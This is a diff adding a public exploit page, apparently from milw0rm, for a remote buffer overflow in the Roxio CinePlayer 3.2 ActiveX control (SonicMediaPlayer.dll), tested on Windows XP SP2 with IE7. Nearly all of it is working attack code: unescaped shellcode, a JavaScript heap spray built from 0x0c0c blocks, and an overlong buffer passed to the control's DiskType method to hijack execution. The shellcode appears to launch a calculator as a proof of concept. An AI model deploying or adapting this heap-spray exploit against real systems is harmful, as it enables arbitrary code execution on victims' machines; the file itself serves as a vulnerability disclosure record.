@@ -1,0 +1,30 @@
+<html>
+ <head>
+  <title>Roxio CinePlayer 3.2 (SonicMediaPlayer.dll) Remote BOF Exploit</title>
+<br>Roxio CinePlayer 3.2 (SonicMediaPlayer.dll) Remote BOF Exploit</br>
+<br>Advisory from secunia 22251</br>
+<br>By : Super-cristal</br>
+<br>Greetings: His0k4, snakespc.com</br>
+<br>Tested on Windows Xp Sp2 (en),with IE7</br>
+
+<object classid='clsid:9F1363DA-0220-462E-B923-9E3C9038896F' id='test'></object>
+<script language='javascript'>
+
+	 shellcode = unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
+	 nops=unescape('%u0c0c%u0c0c');
+	 headersize =20;
+	 slackspace= headersize + shellcode.length;
+	while( nops.length< slackspace) nops+= nops;
+	 fillblock= nops.substring(0, slackspace);
+	 block= nops.substring(0, nops.length- slackspace);
+	while( block.length+ slackspace<262144) block= block+ block+ fillblock;
+	 memory=new Array();
+	for( counter=0; counter<500; counter++) memory[ counter]= block+ shellcode;
+	 buffer='';
+	for( counter=0; counter<=200; counter++) buffer+=unescape('%0c%0c%0c%0c');
+	test.DiskType( buffer);
+</script>
+</head>
+</html>
+
+# milw0rm.com [2009-05-29]
